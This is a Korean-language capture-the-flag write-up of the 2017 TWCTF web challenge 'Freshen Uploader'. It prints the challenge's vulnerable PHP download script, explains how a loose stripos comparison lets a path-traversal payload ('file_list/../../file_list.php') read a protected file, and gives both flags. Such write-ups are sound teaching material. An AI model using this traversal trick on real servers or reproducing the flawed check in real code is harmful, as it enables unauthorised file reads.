# 2017 TWCTF - [Web] Freshen Uploader
## Problem
```
In this year, we stopped using Windows so you can't use DOS tricks!
http://fup.chal.ctf.westerns.tokyo/
```
## Solution
처음 문제페이지를 들어가면 3개의 링크가 있는데, 파일을 다운로드 할 수가 있습니다. 저는 이 것을 보고 간단한 `LFI` 로 접근을 하여, `index.php` 를 다운로드 받았습니다.

```
<?php
/**
 *
 */
include('file_list.php');
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Uploader</title>

    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
  </head>
  <body>
    <div class="container">
      <div class="page-header">
        <h1>Complex Uploader</h1>
        <p class="lead">Upload feature is disabled.</p>
      </div>
      <h3>Files</h3>
      <table class="table table-bordered">
        <thead>
          <tr>
            <th>#</th>
            <th>Filename</th>
            <th>Size</th>
            <th>Link</th>
          </tr>
        </thead>
        <tbody>
          <?php foreach($files as $file): ?>
<?php if($file[0]) continue; ?>
          <tr>
            <td><?= $file[1]; ?></td>
            <td><?= $file[2]; ?></td>
            <td><?= $file[3]; ?> bytes</td>
            <td><a href="download.php?f=<?= $file[4]; ?>">Download</a></td>
          </tr>
          <?php endforeach;?>
        </tbody>
      </table>
      </h3>
    </div>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
  </body>
</html>
```

`index.php` 소스 위쪽에 `file_list.php` 를 인클루드하는 코드를 보고 `file_list.php` 을 받을려고 해보니 다운로드가 안됩니다.

`download.php` 에서 필터링이 걸려있는 것 같아서, `download.php` 를 다운받아서 확인해보니 첫번째 플래그가 나오는 것을 확인할 수 있습니다.

```
<?php
// TWCTF{then_can_y0u_read_file_list?}
$filename = $_GET['f'];
if(stripos($filename, 'file_list') != false) die();
header("Content-Type: application/octet-stream");
header("Content-Disposition: attachment; filename='$filename'");
readfile("uploads/$filename");
```

그리고 `then_can_y0u_read_file_list?` 라는 플래그 문장을 보고 마지막 과정 하나가 더 있겠다 싶었습니다.

결국 `file_list` 까지 확인을 해야 최종플래그에 도달할 수 있는 것 같습니다.

우선 코드를 살펴봅시다.

`if`문과 `stripos` 로 넘겨받는 인자에 `file_list` 가 존재하면 `die` 합니다.
여기서 연산자를 잘보면, `!=` 임을 알 수가 있는데 이 때문에 해당 조건이 취약해지게 됩니다.

`stripos` 가 문자열의 첫 시작 위치를 반환해주는 함수인데, 맨 처음에 `file_list` 가 들어가면 문자열의 첫 시작은 0이니 0을 반환하게됩니다. 그러면, 0 은 false 이니 해당 조건문을 우회할수가 있습니다.

그러면 이를 이용하여 페이로드를 짜봅시다.

`file_list/../../file_list.php`

해당 페이로드를 보내면, `file_list.php` 가 다운로드 됩니다.

```
<?php
$files = [
  [FALSE, 1, 'test.cpp', 192, '6a92b449761226434f5fce6c8e87295a'],
  [FALSE, 2, 'test.c', 325, '27259bca9edf408829bb749969449550'],
  [TRUE, 3, 'flag_ef02dee64eb575d84ba626a78ad4e0243aeefd19145bc6502efe7018c4085213', 1337, 'flag_ef02dee64eb575d84ba626a78ad4e0243aeefd19145bc6502efe7018c4085213'],
  [FALSE, 4, 'test.py', 94, '951470281beb8a490a941ac73bd10953'],
];
```

여기서 플래그 파일이 `flag_ef02dee64eb575d84ba626a78ad4e0243aeefd19145bc6502efe7018c4085213` 이니 해당 파일을 다운로드 해주어 확인을 해보면 2번째 플래그가 나옵니다.

`TWCTF{php_is_very_secure}`
